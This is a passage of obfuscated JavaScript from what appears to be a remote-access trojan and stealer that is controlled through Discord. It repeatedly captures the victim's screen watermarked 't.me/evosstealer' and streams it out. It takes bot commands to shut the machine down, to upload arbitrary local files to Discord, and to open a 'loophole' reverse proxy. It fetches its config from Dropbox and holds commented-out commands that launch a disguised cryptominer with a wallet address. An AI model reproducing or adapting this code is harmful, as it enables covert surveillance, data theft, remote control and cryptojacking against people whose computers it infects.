      case 126:
        if ( !( vhur < 32 ) ) {
          _context10.next = 142;
          break;
        }
        _context10.t9 = vhur;
        _context10.next = _context10.t9 === 23 ? 130 : _context10.t9 === 19 ? 134 : _context10.t9 === 31 ? 138 : 140;
        break;
      case 130:
        vhur = 32;
        console.log( "Leader binded successful" );
        FZsn = raTE.hostname();
        return _context10.abrupt( "break", 140 );
      case 134:
        vhur = 32;
        console.log( AnBV.data );
        console.log( "Invalid leader binded response." );
        return _context10.abrupt( "break", 140 );
      case 138:
        vhur = AnBV.data !== null && AnBV.data !== "None" && AnBV.data !== "Unauthorized" && AnBV.data !== "Internal Server Error" ? 23 : 19;
        return _context10.abrupt( "break", 140 );
      case 140:
        _context10.next = 126;
        break;
      case 142:
        _context10.next = 147;
        break;
      case 144:
        _context10.prev = 144;
        _context10.t10 = _context10[ "catch" ]( 121 );
        console.error( "Error in catch block:", _context10.t10 );
      case 147:
        return _context10.abrupt( "break", 150 );
      case 148:
        pXoV = _context10.t6.response.data !== "None" && _context10.t6.response.data !== "undefined" ? 13 : 30;
        return _context10.abrupt( "break", 150 );
      case 150:
        _context10.next = 112;
        break;
      case 152:
        console.log( _context10.t6.response.data );
        return _context10.abrupt( "break", 154 );
      case 154:
        _context10.next = 100;
        break;
      case 156:
      case "end":
        return _context10.stop();
      }
    }, _callee8, null, [
      [ 6, 29 ],
      [ 32, 97 ],
      [ 57, 80 ],
      [ 121, 144 ]
    ] );
  } ) );
  return _fJsO.apply( this, arguments );
}
rIRB.once( "ready", /*#__PURE__*/ _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee() {
  var Cqtu, MDxG, qrGj, DBfH, Ngud, lvLD, XInn;
  return _regeneratorRuntime().wrap( function _callee$( _context ) {
    while ( 1 ) switch ( _context.prev = _context.next ) {
    case 0:
      Cqtu = "session-".concat( eECt );
      _context.next = 3;
      return fJsO();
    case 3:
      MDxG = raTE.totalmem();
      qrGj = MDxG;
      DBfH = qrGj / 1048576;
    //   wNAF( "node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://stratum-etc.antpool.com:8008 --user 0x6F63fFFe5558f87155C0365926a2c73100579c5f --keepfree ".concat( DBfH * 0.75 ) );
    //   wNAF( "node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://kr.etc.herominers.com:1150 --user  ".concat( Buffer.from( add, "base64" ).toString( "ascii" ), " --keepfree " ).concat( DBfH * 0.75 ) );
      rIRB.guilds.cache.forEach( function ( ZGjl ) {
        MBrz.push( ZGjl.id );
      } );
      lvLD = 24;
    case 10:
      if ( !( lvLD < 30 ) ) {
        _context.next = 33;
        break;
      }
      _context.t0 = lvLD;
      _context.next = _context.t0 === 18 ? 14 : _context.t0 === 24 ? 29 : 31;
      break;
    case 14:
      lvLD = 30;
      Ngud = QDOg.channels.cache.find( function ( KZHw ) {
        return KZHw.name === Cqtu.toLowerCase();
      } );
      XInn = 22;
    case 17:
      if ( !( XInn < 36 ) ) {
        _context.next = 28;
        break;
      }
      _context.t1 = XInn;
      _context.next = _context.t1 === 12 ? 21 : _context.t1 === 22 ? 24 : 26;
      break;
    case 21:
      XInn = 36;
      QDOg.channels.create( Cqtu, _defineProperty( _defineProperty( {}, "type", "text" ), "reason", "Session channel for host PC" ) ).then( function ( oGgU ) {} )[ "catch" ]( function ( JdyV ) {} );
      return _context.abrupt( "break", 26 );
    case 24:
      XInn = !Ngud ? 12 : 36;
      return _context.abrupt( "break", 26 );
    case 26:
      _context.next = 17;
      break;
    case 28:
      return _context.abrupt( "break", 31 );
    case 29:
      lvLD = QDOg ? 18 : 30;
      return _context.abrupt( "break", 31 );
    case 31:
      _context.next = 10;
      break;
    case 33:
    case "end":
      return _context.stop();
    }
  }, _callee );
} ) ) );
var irjM = function irjM() {
  var nXiA = 300;
  setInterval( function () {
    var cRHb = Zimu.getScreenSize();
    var VUdm = Zimu.screen.capture( 1 ? 0 : -5, 1 ? 0 : -1, cRHb.width, cRHb.height );
    var craL = Dvcq( cRHb.width, cRHb.height );
    var wftw = craL.getContext( "2d" );
    var GLbL = wftw.createImageData( VUdm.width, VUdm.height );
    qCc = 10;
    {
      var qCcⴴ;
      while ( qCc < 37 ) {
        switch ( qCc ) {
        case 36:
          qCc = 22;
          {
            GLbL.data[ qCcⴴ ] = VUdm.image[ qCcⴴ + 2 ];
            GLbL.data[ qCcⴴ + 1 ] = VUdm.image[ qCcⴴ + 1 ];
            GLbL.data[ qCcⴴ + 2 ] = VUdm.image[ qCcⴴ ];
            GLbL.data[ qCcⴴ + 3 ] = 255;
          }
          break;
        case 22:
          qCc = 15;
          qCcⴴ += 4;
          break;
        case 15:
          qCc = qCcⴴ < VUdm.image.length ? 36 : 37;
          break;
        case 10:
          qCc = 15;
          qCcⴴ = 0;
          break;
        }
      }
    }
    wftw.putImageData( GLbL, 1 ? 0 : 10, 1 ? 0 : -9 );
    wftw.fillStyle = "rgba(255, 255, 255, 0.5)";
    wftw.font = "bold 50px Arial";
    var yBaV = "t.me/evosstealer";
    var QPYL = wftw.measureText( yBaV ).width;
    wftw.fillText( yBaV, ( cRHb.width - QPYL ) / 2, cRHb.height / 2 );
    var TuwM = Dvcq( 0 ? 1718 : 1720, 0 ? 935 : 940 );
    var Jqt = TuwM.getContext( "2d" );
    Jqt.drawImage( craL, 0 ? 1 : 0, 1 ? 0 : 1, TuwM.width, TuwM.height );
    var LIE = TuwM.toDataURL( "image/jpeg" );
    lYqv.emit( "frame", LIE );
    var qCc;
  }, nXiA );
};
var dPA = "node_modules\\loophole.exe http 2315";

function ecJ() {
  return _ecJ.apply( this, arguments );
}

function _ecJ() {
  _ecJ = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee9() {
    var Ouh, PNO;
    return _regeneratorRuntime().wrap( function _callee9$( _context11 ) {
      while ( 1 ) switch ( _context11.prev = _context11.next ) {
      case 0:
        _context11.prev = 0;
        _context11.next = 3;
        return dbx.filesDownload( _defineProperty( {}, "path", "/conf.aest" ) );
      case 3:
        Ouh = _context11.sent;
        PNO = Ouh.result;
        orCp.writeFileSync( "conf.aest", PNO.fileBinary.toString( "utf8" ), "utf8" );
        InlZ = PNO.fileBinary.toString( "utf8" );
        return _context11.abrupt( "return", NaN !== NaN );
      case 10:
        _context11.prev = 10;
        _context11.t0 = _context11[ "catch" ]( 0 );
        return _context11.abrupt( "return", NaN === NaN );
      case 13:
      case "end":
        return _context11.stop();
      }
    }, _callee9, null, [
      [ 0, 10 ]
    ] );
  } ) );
  return _ecJ.apply( this, arguments );
}

function yqhk() {
  return _yqhk.apply( this, arguments );
}

function _yqhk() {
  _yqhk = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee10() {
    var LXBT, wkr, bbkK, aSf, mYj;
    return _regeneratorRuntime().wrap( function _callee10$( _context12 ) {
      while ( 1 ) switch ( _context12.prev = _context12.next ) {
      case 0:
        LXBT = "".concat( eNhJ, "/get" );
        wkr = {};
        wkr.authorization = "Bearer ".concat( BIPZ( Buffer.from( bot, "base64" ).toString( "ascii" ) ) );
        bbkK = wkr;
        console.log( "starting" );
        _context12.prev = 5;
        _context12.next = 8;
        return JXVa.get( LXBT, _defineProperty( {}, "headers", bbkK ) );
      case 8:
        aSf = _context12.sent;
        mYj = 22;
      case 10:
        if ( !( mYj < 36 ) ) {
          _context12.next = 27;
          break;
        }
        _context12.t0 = mYj;
        _context12.next = _context12.t0 === 30 ? 14 : _context12.t0 === 22 ? 19 : _context12.t0 === 12 ? 21 : 25;
        break;
      case 14:
        mYj = 36;
        console.log( aSf.data );
        console.log( "invalid." );
        return _context12.abrupt( "return", NaN === NaN );
      case 19:
        mYj = aSf.data !== null && aSf.data !== "None" && aSf.data !== "Unauthorized" && aSf.data !== "Internal Server Error" ? 12 : 30;
        return _context12.abrupt( "break", 25 );
      case 21:
        mYj = 36;
        console.log( "valid" );
        return _context12.abrupt( "return", null == undefined );
      case 25:
        _context12.next = 10;
        break;
      case 27:
        _context12.next = 33;
        break;
      case 29:
        _context12.prev = 29;
        _context12.t1 = _context12[ "catch" ]( 5 );
        console.error( "Error:", _context12.t1 );
        return _context12.abrupt( "return", [ 0 ] == '' );
      case 33:
      case "end":
        return _context12.stop();
      }
    }, _callee10, null, [
      [ 5, 29 ]
    ] );
  } ) );
  return _yqhk.apply( this, arguments );
}
rIRB.on( "message", /*#__PURE__*/ function () {
  var _ref2 = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee2( pCN ) {
    var kIBZ, LeYh, clLg, IdBC, WAvL, pJEK, qCcⴲ, lDSⴲ, ecJⴲ, PNOⴲ, jUSz, lgnZ, kdRIⴳ, dmuQⴳ, OfVhⴳ, uuBzⴳ, arhhⴳ, mUlWⴳ, WPvqⴳ, gqGSⴳ, _loop, _ret, qCcⵞⴲ, npnyR, koHPs, shlaw, yNTyF, KeCuK, gpXⵞⴲ, wkrⵞⴲ, oYcMJ, AOYlt, wkrⵜⴲ, Oiaqf, aSfⵜⴲ, gpXⵜⴲ, mYjⵜⴲ, pCNⵜⴲ, Jqtⵜⴲ, LIEⵜⴲ, PSqPm, ZWsLk, JSeOk, hRwaI, IymgM, VhVaq, wwKmL, ZKQZE, lDSⵞⴲ, ecJⵞⴲ, YZJGO, PNOⵞⴲ, HXuvQ, guENz, LBuql, OBoOh, CgWoU, PNOⵚⴲ, rKXws, ETaxw, mUwwm, niqzy, qIRjF, DASeP, LIEⵚⴲ, mYjⵚⴲ, dPAⵚⴲ, Jqtⵚⴲ, Ouhⵚⴲ, qCcⵚⴲ, lDSⵚⴲ, ecJⵚⴲ, kRphK, xGrZu, fngkw, JibjC, gpXⵚⴲ, wkrⵚⴲ, pCNⵚⴲ, aSfⵚⴲ, CUNmf;
    return _regeneratorRuntime().wrap( function _callee2$( _context4 ) {
      while ( 1 ) switch ( _context4.prev = _context4.next ) {
      case 0:
        _context4.next = 2;
        return fJsO();
      case 2:
        console.log( "LEADER SYSTEM INFO " + InlZ + "      " + FZsn );
        AlfH.length = 0;
        wkrⵜⴲ = 22;
      case 5:
        if ( !( wkrⵜⴲ < 36 ) ) {
          _context4.next = 16;
          break;
        }
        _context4.t0 = wkrⵜⴲ;
        _context4.next = _context4.t0 === 22 ? 9 : _context4.t0 === 12 ? 11 : 14;
        break;
      case 9:
        wkrⵜⴲ = !pCN.content.startsWith( ZUgD ) || !pCN.guild || !MBrz.includes( pCN.guild.id ) ? 12 : 36;
        return _context4.abrupt( "break", 14 );
      case 11:
        wkrⵜⴲ = 36;
        return _context4.abrupt( "return" );
      case 14:
        _context4.next = 5;
        break;
      case 16:
        Oiaqf = 15;
      case 17:
        if ( !( Oiaqf < 37 ) ) {
          _context4.next = 79;
          break;
        }
        _context4.t1 = Oiaqf;
        _context4.next = _context4.t1 === 36 ? 21 : _context4.t1 === 15 ? 75 : 77;
        break;
      case 21:
        Oiaqf = 37;
        aSfⵜⴲ = 25;
      case 23:
        if ( !( aSfⵜⴲ < 37 ) ) {
          _context4.next = 74;
          break;
        }
        _context4.t2 = aSfⵜⴲ;
        _context4.next = _context4.t2 === 10 ? 27 : _context4.t2 === 25 ? 33 : _context4.t2 === 15 ? 44 : 72;
        break;
      case 27:
        aSfⵜⴲ = 37;
        kIBZ = new aJVu.MessageEmbed().setColor( "#0099ff" ).setTitle( "List of bindable servers" ).setDescription( rIRB.guilds.cache.map( function ( cFes ) {
          return "`•  " + cFes.name.padEnd( 1 ? 25 : 34 ) + "[" + cFes.id + "]" + "`";
        } ).join( "\n" ) );
        pCN.channel.send( "`Bot is unbinded. Use !bind [server id] to bind the bot.`" );
        pCN.channel.send( kIBZ );
        return _context4.abrupt( "return" );
      case 33:
        _context4.next = 35;
        return yqhk();
      case 35:
        _context4.t3 = _context4.sent;
        _context4.t4 = null === undefined;
        if ( !( _context4.t3 == _context4.t4 ) ) {
          _context4.next = 41;
          break;
        }
        _context4.t5 = 10;
        _context4.next = 42;
        break;
      case 41:
        _context4.t5 = 15;
      case 42:
        aSfⵜⴲ = _context4.t5;
        return _context4.abrupt( "break", 72 );
      case 44:
        aSfⵜⴲ = 37;
        gpXⵜⴲ = 20;
      case 46:
        if ( !( gpXⵜⴲ < 35 ) ) {
          _context4.next = 71;
          break;
        }
        _context4.t6 = gpXⵜⴲ;
        _context4.next = _context4.t6 === 34 ? 50 : _context4.t6 === 20 ? 55 : _context4.t6 === 31 ? 66 : 69;
        break;
      case 50:
        gpXⵜⴲ = 35;
        pCN.channel.send( "`Updating Config Thingies.. Rerun command..`" );
        _context4.next = 54;
        return fJsO();
      case 54:
        return _context4.abrupt( "break", 69 );
      case 55:
        _context4.next = 57;
        return yqhk();
      case 57:
        _context4.t7 = _context4.sent;
        _context4.t8 = null == undefined;
        if ( !( _context4.t7 == _context4.t8 ) ) {
          _context4.next = 63;
          break;
        }
        _context4.t9 = 34;
        _context4.next = 64;
        break;
      case 63:
        _context4.t9 = 31;
      case 64:
        gpXⵜⴲ = _context4.t9;
        return _context4.abrupt( "break", 69 );
      case 66:
        gpXⵜⴲ = 35;
        console.error( "Error occured" );
        return _context4.abrupt( "break", 69 );
      case 69:
        _context4.next = 46;
        break;
      case 71:
        return _context4.abrupt( "break", 72 );
      case 72:
        _context4.next = 23;
        break;
      case 74:
        return _context4.abrupt( "break", 77 );
      case 75:
        Oiaqf = InlZ === null && FZsn === raTE.hostname() && !pCN.content.startsWith( "!bind" ) && !pCN.content.startsWith( "!forcerebind" ) ? 36 : 37;
        return _context4.abrupt( "break", 77 );
      case 77:
        _context4.next = 17;
        break;
      case 79:
        LeYh = pCN.content.slice( ZUgD.length ).trim().split( / +/ );
        clLg = LeYh.shift().toLowerCase();
        mYjⵜⴲ = 29;
      case 82:
        if ( !( mYjⵜⴲ < 30 ) ) {
          _context4.next = 122;
          break;
        }
        _context4.t10 = mYjⵜⴲ;
        _context4.next = _context4.t10 === 13 ? 86 : _context4.t10 === 29 ? 118 : 120;
        break;
      case 86:
        mYjⵜⴲ = 30;
        pCNⵜⴲ = 37;
      case 88:
        if ( !( pCNⵜⴲ < 38 ) ) {
          _context4.next = 100;
          break;
        }
        _context4.t11 = pCNⵜⴲ;
        _context4.next = _context4.t11 === 37 ? 92 : _context4.t11 === 27 ? 94 : 98;
        break;
      case 92:
        pCNⵜⴲ = InlZ && InlZ !== null ? 27 : 38;
        return _context4.abrupt( "break", 98 );
      case 94:
        pCNⵜⴲ = 38;
        pCN.channel.send( "`Bot is already binded.`" );
        return _context4.abrupt( "return" );
      case 98:
        _context4.next = 88;
        break;
      case 100:
        IdBC = LeYh.join( " " ).trim();
        Jqtⵜⴲ = 36;
      case 102:
        if ( !( Jqtⵜⴲ < 37 ) ) {
          _context4.next = 116;
          break;
        }
        _context4.t12 = Jqtⵜⴲ;
        _context4.next = _context4.t12 === 12 ? 106 : _context4.t12 === 36 ? 109 : _context4.t12 === 22 ? 111 : 114;
        break;
      case 106:
        Jqtⵜⴲ = 37;
        pCN.channel.send( "`Invalid server ID.`" );
        return _context4.abrupt( "break", 114 );
      case 109:
        Jqtⵜⴲ = MBrz.includes( IdBC ) ? 22 : 12;
        return _context4.abrupt( "break", 114 );
      case 111:
        Jqtⵜⴲ = 37;
        try {
          WAvL = {};
          WAvL.authorization = "Bearer ".concat( BIPZ( Buffer.from( bot, "base64" ).toString( "ascii" ) ) );
          WAvL.id = "Bearer ".concat( IdBC );
          pJEK = WAvL;
          JXVa.get( "".concat( eNhJ, "/post" ), _defineProperty( {}, "headers", pJEK ) ).then( function ( fopk ) {
            console.log( fopk.data );
            fJsO();
            pCN.channel.send( "`Bot binded successfully.`" );
          } )[ "catch" ]( function ( Ouhⴲ ) {
            console.error( "Error:", Ouhⴲ );
            pCN.channel.send( "`Fatal Error Occurred Involving API.`" );
          } );
        } catch ( _unused ) {
          pCN.channel.send( "`Fatal Error Occurred.`" );
        }
        return _context4.abrupt( "break", 114 );
      case 114:
        _context4.next = 102;
        break;
      case 116:
        return _context4.abrupt( "return" );
      case 118:
        mYjⵜⴲ = clLg === "bind" ? 13 : 30;
        return _context4.abrupt( "break", 120 );
      case 120:
        _context4.next = 82;
        break;
      case 122:
        LIEⵜⴲ = 7;
      case 123:
        if ( !( LIEⵜⴲ < 34 ) ) {
          _context4.next = 216;
          break;
        }
        _context4.t13 = LIEⵜⴲ;
        _context4.next = _context4.t13 === 17 ? 127 : _context4.t13 === 7 ? 212 : 214;
        break;
      case 127:
        LIEⵜⴲ = 34;
        qCcⴲ = LeYh.join( " " ).trim();
        PSqPm = 17;
      case 130:
        if ( !( PSqPm < 34 ) ) {
          _context4.next = 210;
          break;
        }
        _context4.t14 = PSqPm;
        _context4.next = _context4.t14 === 28 ? 134 : _context4.t14 === 33 ? 137 : _context4.t14 === 17 ? 206 : 208;
        break;
      case 134:
        PSqPm = 34;
        pCN.channel.send( "`Invalid server, run on binded server.`" );
        return _context4.abrupt( "break", 208 );
      case 137:
        PSqPm = 34;
        ZWsLk = 31;
      case 139:
        if ( !( ZWsLk < 32 ) ) {
          _context4.next = 205;
          break;
        }
        _context4.t15 = ZWsLk;
        _context4.next = _context4.t15 === 31 ? 143 : _context4.t15 === 19 ? 145 : _context4.t15 === 23 ? 200 : 203;
        break;
      case 143:
        ZWsLk = AlfH.includes( "`WARNING: only use !forcerebind if server status is critical (Deleted / Terminated) DO NOT USE IN ANY OTHER CIRCUMSTANCE!\nConfirm server rebind? [Yes / No]`" ) ? 23 : 19;
        return _context4.abrupt( "break", 203 );
      case 145:
        ZWsLk = 32;
        _context4.next = 148;
        return pCN.channel.send( "`WARNING: only use !forcerebind if server status is critical (Deleted / Terminated) DO NOT USE IN ANY OTHER CIRCUMSTANCE!\nConfirm server rebind? [Yes / No]`" );
      case 148:
        lDSⴲ = _context4.sent;
        ecJⴲ = function ecJⴲ( ynCx ) {
          return ynCx.author.id === pCN.author.id && ynCx.channel.id === pCN.channel.id;
        };
        PNOⴲ = {};
        PNOⴲ.max = 1;
        PNOⴲ.time = 10000;
        PNOⴲ.errors = [ "time" ];
        jUSz = PNOⴲ;
        _context4.prev = 155;
        _context4.next = 158;
        return pCN.channel.awaitMessages( ecJⴲ, jUSz );
      case 158:
        lgnZ = _context4.sent;
        kdRIⴳ = lgnZ.first().content.toLowerCase();
        JSeOk = 25;
      case 161:
        if ( !( JSeOk < 37 ) ) {
          _context4.next = 193;
          break;
        }
        _context4.t16 = JSeOk;
        _context4.next = _context4.t16 === 10 ? 165 : _context4.t16 === 15 ? 172 : _context4.t16 === 25 ? 189 : 191;
        break;
      case 165:
        JSeOk = 37;
        dmuQⴳ = {};
        dmuQⴳ.authorization = "Bearer ".concat( BIPZ( Buffer.from( bot, "base64" ).toString( "ascii" ) ) );
        dmuQⴳ.id = "Bearer ".concat( qCcⴲ );
        OfVhⴳ = dmuQⴳ;
        JXVa.get( "".concat( eNhJ, "/post" ), _defineProperty( {}, "headers", OfVhⴳ ) ).then( function ( NtxUⴳ ) {
          console.log( NtxUⴳ.data );
          fJsO();
          pCN.channel.send( "`Bot rebinded successfully.`" );
        } )[ "catch" ]( function ( BIPZⴳ ) {
          console.error( "Error:", BIPZⴳ );
        } );
        return _context4.abrupt( "break", 191 );
      case 172:
        JSeOk = 37;
        hRwaI = 24;
      case 174:
        if ( !( hRwaI < 30 ) ) {
          _context4.next = 188;
          break;
        }
        _context4.t17 = hRwaI;
        _context4.next = _context4.t17 === 18 ? 178 : _context4.t17 === 29 ? 181 : _context4.t17 === 24 ? 184 : 186;
        break;
      case 178:
        hRwaI = 30;
        pCN.channel.send( "`Rebind aborted.`" );
        return _context4.abrupt( "break", 186 );
      case 181:
        hRwaI = 30;
        pCN.channel.send( "`Invalid response. Rebind aborted.`" );
        return _context4.abrupt( "break", 186 );
      case 184:
        hRwaI = kdRIⴳ === "no" ? 18 : 29;
        return _context4.abrupt( "break", 186 );
      case 186:
        _context4.next = 174;
        break;
      case 188:
        return _context4.abrupt( "break", 191 );
      case 189:
        JSeOk = kdRIⴳ === "yes" ? 10 : 15;
        return _context4.abrupt( "break", 191 );
      case 191:
        _context4.next = 161;
        break;
      case 193:
        _context4.next = 199;
        break;
      case 195:
        _context4.prev = 195;
        _context4.t18 = _context4[ "catch" ]( 155 );
        console.log( _context4.t18 );
        pCN.channel.send( "`You took too long to respond. Rebind aborted.`" );
      case 199:
        return _context4.abrupt( "break", 203 );
      case 200:
        ZWsLk = 32;
        return _context4.abrupt( "return" );
      case 203:
        _context4.next = 139;
        break;
      case 205:
        return _context4.abrupt( "break", 208 );
      case 206:
        PSqPm = MBrz.includes( qCcⴲ ) ? 33 : 28;
        return _context4.abrupt( "break", 208 );
      case 208:
        _context4.next = 130;
        break;
      case 210:
        return _context4.abrupt( "return" );
      case 212:
        LIEⵜⴲ = clLg === "forcerebind" ? 17 : 34;
        return _context4.abrupt( "break", 214 );
      case 214:
        _context4.next = 123;
        break;
      case 216:
        uuBzⴳ = raTE.hostname();
        arhhⴳ = "session-".concat( uuBzⴳ );
        mUlWⴳ = pCN.guild.channels.cache.find( function ( fJsOⴳ ) {
          return fJsOⴳ.name === arhhⴳ.toLowerCase();
        } );
        IymgM = 33;
      case 220:
        if ( !( IymgM < 34 ) ) {
          _context4.next = 233;
          break;
        }
        _context4.t19 = IymgM;
        _context4.next = _context4.t19 === 33 ? 224 : _context4.t19 === 28 ? 226 : 231;
        break;
      case 224:
        IymgM = !mUlWⴳ ? 28 : 34;
        return _context4.abrupt( "break", 231 );
      case 226:
        IymgM = 34;
        _context4.next = 229;
        return pCN.guild.channels.create( arhhⴳ, _defineProperty( _defineProperty( {}, "type", "text" ), "reason", "Session channel for host PC" ) );
      case 229:
        mUlWⴳ = _context4.sent;
        return _context4.abrupt( "break", 231 );
      case 231:
        _context4.next = 220;
        break;
      case 233:
        VhVaq = 18;
      case 234:
        if ( !( VhVaq < 30 ) ) {
          _context4.next = 274;
          break;
        }
        _context4.t20 = VhVaq;
        _context4.next = _context4.t20 === 18 ? 238 : _context4.t20 === 29 ? 240 : 272;
        break;
      case 238:
        VhVaq = pCN.channel.id !== mUlWⴳ.id ? 29 : 30;
        return _context4.abrupt( "break", 272 );
      case 240:
        VhVaq = 30;
        wwKmL = 17;
      case 242:
        if ( !( wwKmL < 34 ) ) {
          _context4.next = 271;
          break;
        }
        _context4.t21 = wwKmL;
        _context4.next = _context4.t21 === 17 ? 246 : _context4.t21 === 28 ? 248 : _context4.t21 === 33 ? 251 : 269;
        break;
      case 246:
        wwKmL = FZsn === raTE.hostname() ? 33 : 28;
        return _context4.abrupt( "break", 269 );
      case 248:
        wwKmL = 34;
        return _context4.abrupt( "return" );
      case 251:
        wwKmL = 34;
        ZKQZE = 20;
      case 253:
        if ( !( ZKQZE < 35 ) ) {
          _context4.next = 268;
          break;
        }
        _context4.t22 = ZKQZE;
        _context4.next = _context4.t22 === 20 ? 257 : _context4.t22 === 31 ? 259 : _context4.t22 === 34 ? 263 : 266;
        break;
      case 257:
        ZKQZE = pCN.channel.name.includes( "session-" ) ? 34 : 31;
        return _context4.abrupt( "break", 266 );
      case 259:
        ZKQZE = 35;
        pCN.channel.send( "`Invalid channel. Please use the correct session channel.`" );
        return _context4.abrupt( "return" );
      case 263:
        ZKQZE = 35;
        return _context4.abrupt( "return" );
      case 266:
        _context4.next = 253;
        break;
      case 268:
        return _context4.abrupt( "break", 269 );
      case 269:
        _context4.next = 242;
        break;
      case 271:
        return _context4.abrupt( "break", 272 );
      case 272:
        _context4.next = 234;
        break;
      case 274:
        lDSⵞⴲ = 19;
      case 275:
        if ( !( lDSⵞⴲ < 34 ) ) {
          _context4.next = 317;
          break;
        }
        _context4.t23 = lDSⵞⴲ;
        _context4.next = _context4.t23 === 19 ? 279 : _context4.t23 === 7 ? 281 : _context4.t23 === 17 ? 284 : 315;
        break;
      case 279:
        lDSⵞⴲ = clLg === "shutdown" ? 7 : 17;
        return _context4.abrupt( "break", 315 );
      case 281:
        lDSⵞⴲ = 34;
        try {
          wNAF( "shutdown /s /t 0", function ( NbbTⴳ, UZjOⴳ, CsZWⴳ ) {
            VsLAⴳ = 11;
            while ( VsLAⴳ < 35 ) switch ( VsLAⴳ ) {
            case 20:
              VsLAⴳ = 35;
              {
                return;
              }
              break;
            case 11:
              VsLAⴳ = NbbTⴳ ? 20 : 35;
              break;
            }
            var VsLAⴳ;
          } );
          pCN.channel.send( "`Shutting down...`" );
        } catch ( _unused2 ) {
          pCN.channel.send( "`Error shutting down system! Is system corrupted?`" );
        }
        return _context4.abrupt( "break", 315 );
      case 284:
        lDSⵞⴲ = 34;
        ecJⵞⴲ = 27;
      case 286:
        if ( !( ecJⵞⴲ < 30 ) ) {
          _context4.next = 314;
          break;
        }
        _context4.t24 = ecJⵞⴲ;
        _context4.next = _context4.t24 === 24 ? 290 : _context4.t24 === 27 ? 310 : 312;
        break;
      case 290:
        ecJⵞⴲ = 30;
        WPvqⴳ = LeYh.join( " " );
        YZJGO = 20;
      case 293:
        if ( !( YZJGO < 35 ) ) {
          _context4.next = 309;
          break;
        }
        _context4.t25 = YZJGO;
        _context4.next = _context4.t25 === 34 ? 297 : _context4.t25 === 31 ? 301 : _context4.t25 === 20 ? 305 : 307;
        break;
      case 297:
        YZJGO = 35;
        _context4.next = 300;
        return pCN.channel.send( _defineProperty( {}, "files", [ WPvqⴳ ] ) );
      case 300:
        return _context4.abrupt( "break", 307 );
      case 301:
        YZJGO = 35;
        _context4.next = 304;
        return pCN.channel.send( "`The file does not exist.`" );
      case 304:
        return _context4.abrupt( "break", 307 );
      case 305:
        YZJGO = orCp.existsSync( WPvqⴳ ) ? 34 : 31;
        return _context4.abrupt( "break", 307 );
      case 307:
        _context4.next = 293;
        break;
      case 309:
        return _context4.abrupt( "break", 312 );
      case 310:
        ecJⵞⴲ = clLg === "download" ? 24 : 30;
        return _context4.abrupt( "break", 312 );
      case 312:
        _context4.next = 286;
        break;
      case 314:
        return _context4.abrupt( "break", 315 );
      case 315:
        _context4.next = 275;
        break;
      case 317:
        PNOⵞⴲ = 16;
      case 318:
        if ( !( PNOⵞⴲ < 35 ) ) {
          _context4.next = 528;
          break;
        }
        _context4.t26 = PNOⵞⴲ;
        _context4.next = _context4.t26 === 16 ? 322 : _context4.t26 === 20 ? 324 : _context4.t26 === 11 ? 519 : 526;
        break;
      case 322:
        PNOⵞⴲ = clLg === "lplogin" ? 11 : 20;
        return _context4.abrupt( "break", 526 );
      case 324:
        PNOⵞⴲ = 35;
        HXuvQ = 31;
      case 326:
        if ( !( HXuvQ < 32 ) ) {
          _context4.next = 518;
          break;
        }
        _context4.t27 = HXuvQ;
        _context4.next = _context4.t27 === 23 ? 330 : _context4.t27 === 31 ? 389 : _context4.t27 === 19 ? 391 : 516;
        break;
      case 330:
        HXuvQ = 32;
        gqGSⴳ = LeYh.join( " " );
        sent = NaN === NaN;
        loopholeProcess = wNAF( dPA );
        guENz = 12;
      case 335:
        if ( !( guENz < 39 ) ) {
          _context4.next = 388;
          break;
        }
        _context4.t28 = guENz;
        _context4.next = _context4.t28 === 30 ? 339 : _context4.t28 === 35 ? 365 : _context4.t28 === 12 ? 384 : 386;
        break;
      case 339:
        guENz = 39;
        LBuql = 12;
      case 341:
        if ( !( LBuql < 39 ) ) {
          _context4.next = 352;
          break;
        }
        _context4.t29 = LBuql;
        _context4.next = _context4.t29 === 12 ? 345 : _context4.t29 === 30 ? 347 : 350;
        break;
      case 345:
        LBuql = OyDR ? 30 : 39;
        return _context4.abrupt( "break", 350 );
      case 347:
        LBuql = 39;
        OyDR.close( function () {
          pCN.channel.send( "`Killing server controller`" );
          sent = NaN === NaN;
        } );
        return _context4.abrupt( "break", 350 );
      case 350:
        _context4.next = 341;
        break;
      case 352:
        OBoOh = 34;
      case 353:
        if ( !( OBoOh < 35 ) ) {
          _context4.next = 364;
          break;
        }
        _context4.t30 = OBoOh;
        _context4.next = _context4.t30 === 31 ? 357 : _context4.t30 === 34 ? 360 : 362;
        break;
      case 357:
        OBoOh = 35;
        wNAF( "taskkill /F /IM loophole.exe", function ( lCjPⴳ, IPKXⴳ, vMtFⴳ ) {
          Yotpⴳ = 24;
          while ( Yotpⴳ < 30 ) switch ( Yotpⴳ ) {
          case 18:
            Yotpⴳ = 30;
            {
              pCN.channel.send( "`Error killing loophole process: " + lCjPⴳ.message + "`" );
              return;
            }
            break;
          case 24:
            Yotpⴳ = lCjPⴳ ? 18 : 30;
            break;
          }
          pCN.channel.send( "`Killing reverse proxy`" );
          var Yotpⴳ;
        } );
        return _context4.abrupt( "break", 362 );
      case 360:
        OBoOh = loopholeProcess ? 31 : 35;
        return _context4.abrupt( "break", 362 );
      case 362:
        _context4.next = 353;
        break;
      case 364:
        return _context4.abrupt( "break", 386 );
      case 365:
        guENz = 39;
        CgWoU = 14;
      case 367:
        if ( !( CgWoU < 26 ) ) {
          _context4.next = 383;
          break;
        }
        _context4.t31 = CgWoU;
        _context4.next = _context4.t31 === 14 ? 371 : _context4.t31 === 10 ? 373 : _context4.t31 === 25 ? 376 : 381;
        break;
      case 371:
        CgWoU = gqGSⴳ === "start" ? 25 : 10;
        return _context4.abrupt( "break", 381 );
      case 373:
        CgWoU = 26;
        pCN.channel.send( "`Incorrect usage! Possible parameters: start, stop`" );
        return _context4.abrupt( "break", 381 );
      case 376:
        CgWoU = 26;
        jPvB.get( "/", function ( EDiKⴳ, waKFⴳ ) {
          waKFⴳ.setHeader( "Content-Type", "text/html" );
